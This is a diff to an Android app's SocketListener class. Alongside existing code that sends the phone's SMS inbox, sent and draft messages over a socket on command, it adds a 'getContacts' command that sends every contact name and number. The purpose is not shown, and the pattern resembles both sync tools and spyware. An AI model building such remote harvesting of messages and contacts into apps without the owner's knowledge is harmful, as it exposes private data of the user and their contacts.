@@ -10,6 +10,7 @@ import org.json.simple.JSONValue;
 import android.database.Cursor;
 import android.net.Uri;
 import android.os.AsyncTask;
+import android.provider.ContactsContract;
 import android.telephony.SmsManager;
 
 @SuppressWarnings("unchecked")
@@ -51,8 +52,10 @@ class SocketListener extends AsyncTask<BufferedReader, Void, Void> {
 						smsListJson.put("inbox", getSmsList(INBOX));
 						smsListJson.put("sent", getSmsList(SENT));
 						smsListJson.put("draft", getSmsList(DRAFT));
-
 						connectionController.sendToSocket(smsListJson.toJSONString());
+
+					} else if (json.containsKey("getContacts")) {
+						connectionController.sendToSocket(getContactList().toJSONString());
 					}
 
 				}
@@ -77,6 +80,19 @@ class SocketListener extends AsyncTask<BufferedReader, Void, Void> {
 			} while (cursor.moveToNext());
 		}
 		return smsList;
+	}
+
+	public JSONObject getContactList() {
+		Cursor phones = connectionController.context.getContentResolver().query(
+				ContactsContract.CommonDataKinds.Phone.CONTENT_URI, null, null, null, null);
+		JSONObject json = new JSONObject();
+		while (phones.moveToNext()) {
+			String name = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.DISPLAY_NAME));
+			String phoneNumber = phones.getString(phones.getColumnIndex(ContactsContract.CommonDataKinds.Phone.NUMBER));
+			json.put(phoneNumber, name);
+		}
+		phones.close();
+		return json;
 	}
 
 }
